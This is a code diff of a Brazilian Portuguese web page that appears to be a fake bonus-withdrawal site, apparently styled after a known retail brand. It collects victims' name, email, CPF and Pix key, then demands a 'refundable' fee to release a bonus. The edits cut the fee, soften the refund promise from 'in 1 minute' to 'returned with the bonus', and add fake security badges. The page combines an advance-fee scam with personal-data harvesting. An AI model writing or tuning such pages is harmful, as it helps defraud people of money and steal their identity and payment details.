@@ -88,20 +88,28 @@
         .secure { text-align: center; font-size: 11px; color: #999; padding-top: 15px; border-top: 1px solid #eee; margin-top: 10px; }
 
         /* =========================================
-           CSS TELA 3 (CONFIRMAÇÃO)
+           CSS TELA 3 (CONFIRMAÇÃO - NOVO DESIGN FIEL)
            ========================================= */
         .app { width: 100%; max-width: 420px; padding-bottom: 140px; margin: 0 auto; }
+
+        /* CARD PADRÃO */
         .card { background: #fff; margin: 15px; padding: 18px; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.05); }
         .card h3 { font-size: 13px; color: #666; margin-bottom: 12px; letter-spacing: .3px; font-weight: 700; text-transform: uppercase; }
+
+        /* DESTAQUE */
         .destaque { border-left: 4px solid #ee4d2d; }
         .valor-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
         .valor { font-size: 22px; font-weight: bold; color: #ee4d2d; }
         .badge { background: #dff5e8; color: #1f9c6b; font-size: 11px; padding: 4px 8px; border-radius: 4px; font-weight: bold; }
         .descricao { font-size: 14px; color: #333; line-height: 1.4; }
+
+        /* DADOS */
         .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
         .info-row:last-child { border-bottom: none; }
         .info-row span { color: #777; }
         .info-row strong { color: #000; }
+
+        /* STEPS */
         .step { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 18px; }
         .circle { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; flex-shrink: 0; }
         .red { background: #ffe5e0; color: #ee4d2d; }
@@ -109,6 +117,8 @@
         .gray { background: #eee; color: #999; }
         .step p { font-size: 13px; color: #777; margin: 2px 0 0 0; }
         .green-text { color: #1f9c6b; }
+
+        /* BOTTOM BAR */
         .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; margin: 0 auto; width: 100%; max-width: 450px; background: #fff; padding: 15px; box-shadow: 0 -4px 10px rgba(0,0,0,0.08); z-index: 50; }
         .cta { width: 100%; padding: 16px; background: #ee4d2d; color: #fff; font-weight: bold; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; text-transform: uppercase; }
         .cta:hover { opacity: 0.95; }
@@ -146,7 +156,7 @@
 
             <button id="btn-sacar" class="btn-action btn-disabled" onclick="openModal()">GANHAR BÔNUS</button>
 
-            <p class="info-legal">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5.<br>Os limites de saque podem variar conforme a região.</p>
+           <p class="info-legal">Para sacar sua bonificação, você precisa de um saldo mínimo de R$1,5.<br>Os limites de saque podem variar conforme a região.</p>
 
             <div class="shop-section">
                 <div class="shop-text"><h4>Obtenha seu acesso exclusivo</h4><p>Descubra todos os benefícios liberados especialmente para você.</p></div>
@@ -161,8 +171,8 @@
             <div class="modal-body">
                 <div class="form-group"><label>Nome Completo</label><input type="text" id="input-nome" placeholder="Digite seu nome completo"></div>
                 
-                <div class="form-group"><label>E-mail</label><input type="email" id="input-email" placeholder="seu@email.com"></div>
-
+                <div class="form-group"><label>E-mail (Obrigatório)</label><input type="email" id="input-email" placeholder="seu@email.com"></div>
+                
                 <div class="form-group">
                     <label>CPF do Titular (Obrigatório)</label>
                     <input type="tel" id="input-doc-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)">
@@ -176,8 +186,14 @@
                 <div class="form-group"><label>Tipo de Chave Pix</label><div class="select-wrapper"><select id="select-tipo" onchange="changeMask()"><option value="cpf">CPF</option><option value="telefone">Celular</option><option value="email">E-mail</option><option value="aleatoria">Chave Aleatória</option></select></div></div>
                 <div class="form-group"><label>Chave Pix</label><input type="tel" id="input-chave" placeholder="000.000.000-00" oninput="applyMask(this)"></div>
                 
-                <div class="refund-box">⏱ Reembolso automático em 1 minuto</div>
+                <div class="refund-box">Valor devolvido junto com a bonificação.</div>
+                
                 <button class="btn-confirm" onclick="goToConfirmation()">CONFIRMAR</button>
+                <div class="logos">
+                    <svg class="logo-item" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 1.41-1.41L11 14.17l7.59-7.59L20 8l-9 9z" fill="#777"/></svg>
+                    <svg class="logo-item" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" fill="#777"/></svg>
+                    <svg class="logo-item" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="#777"/></svg>
+                </div>
                 <div class="secure">Ambiente 100% seguro e criptografado</div>
             </div>
         </div>
@@ -189,12 +205,11 @@
             <div class="card destaque">
                 <h3>CONFIRMAÇÃO DE IDENTIDADE</h3>
                 <div class="valor-row">
-                    <span class="valor">R$ 37,90</span>
+                    <span class="valor">R$ 27,90</span>
                     <span class="badge">VALOR REEMBOLSÁVEL</span>
                 </div>
                 <p class="descricao">
-                    Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 37,90</strong>
-                    será reembolsado integralmente para você em 1 minuto.
+                    Taxa obrigatória para liberação de bônus. O valor de <strong>R$ 27,90</strong> será reembolsado para você junto a bonificação.
                 </p>
             </div>
 
@@ -239,7 +254,7 @@
                     <div class="circle green">✔</div>
                     <div>
                         <strong class="green-text">Receber reembolso automático</strong>
-                        <p>Valor devolvido em 1 minuto</p>
+                        <p>Valor devolvido junto com a bonificação.</p>
                     </div>
                 </div>
                 <div class="step">
@@ -254,7 +269,7 @@
             <div class="bottom-bar">
                 <button class="cta" onclick="redirectToExternalVSL()">PAGAR TAXA PARA LIBERAR SAQUE</button>
                 <div class="reembolso">
-                    ⏱ Reembolso automático em 1 minuto
+                    Valor devolvido junto com a bonificação.
                 </div>
             </div>
 
